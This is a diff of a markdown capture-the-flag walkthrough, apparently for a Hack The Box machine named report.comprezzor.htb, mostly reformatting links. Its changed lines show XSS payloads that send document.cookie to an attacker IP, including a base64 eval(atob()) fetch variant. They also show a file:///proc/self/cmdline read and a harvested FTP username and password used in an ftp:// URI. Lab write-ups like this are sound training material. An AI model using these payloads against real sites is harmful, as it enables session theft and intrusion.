@@ -35,7 +35,7 @@ report.comprezzor.htb
 
 - Tried the following XSS:
 ```java
-"/><img src="http://10.10.14.94/a?cookie=' + document.cookie + '"/>
+"/><img src="http ://10.10.14.94/a?cookie=' + document.cookie + '"/>
 
 ```
 But didn't get the cookie back:
@@ -46,7 +46,7 @@ But didn't get the cookie back:
 - Obfuscate the payload (base64) and use eval(atob()):
   - Using the payload:  
 ```bash
-fetch("http://10.10.14.94/"+document.cookie);
+fetch("http ://10.10.14.94/"+document.cookie);
 
 ```
 Full XSS evaluates to:
@@ -166,7 +166,7 @@ User-Agent: Python-urllib/3.11
 
 - To see the current running process on the machine - we can check /proc:
 
-[file:///proc/self/cmdline](http://.)
+file:///proc/self/cmdline
 
 
 ![image24](../resources/684b6aa16fbc4926b7a4cb59d726916c.png)
@@ -201,9 +201,9 @@ So we can see Python3 is running an app.py file
 
 user='ftp_admin', passwd='u3jai8y71s2'
 
-- To connect to the ftp server (running locally) - we can use the FTP URI: [ftp://username:password@hostname](http://.)
+- To connect to the ftp server (running locally) - we can use the FTP URI: ftp://username:password@hostname
 
-[ftp://ftp_admin:u3jai8y71s2@ftp.local](http://.)
+ftp://ftp_admin:u3jai8y71s2@ftp.local
 
 
 ![image30](../resources/ca2fe8ea2a9347c8a47c2a46b4ed2fe0.png)
